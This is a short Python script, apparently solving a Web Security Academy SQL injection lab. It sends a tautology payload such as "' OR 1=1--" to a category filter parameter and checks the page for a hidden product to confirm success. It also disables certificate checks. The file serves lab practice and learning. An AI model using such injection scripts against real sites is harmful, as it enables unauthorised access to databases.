import requests;
import sys;
import urllib3;
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#CMD: python3 sqli-lab-01.py https://0a8900c603d883c780877152002f0049.web-security-academy.net "' OR 1=1--"
#proxies = {'http': 'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'} - Use with Burp suite Proxy

def exploit_sqli(url,payload):
    uri = '/filter?category='
    #r = requests.get(url + uri + payload,verify=False,proxies=proxies) With Burp Suite Proxy
    r = requests.get(url + uri + payload,verify=False)
    if "Cat Grin" in r.text :
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] %s www.example.com  "1=1"' % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url,payload):
        print("[+] SQL injection successful")
    else:
        print("[-] SQL injection unsuccessful")
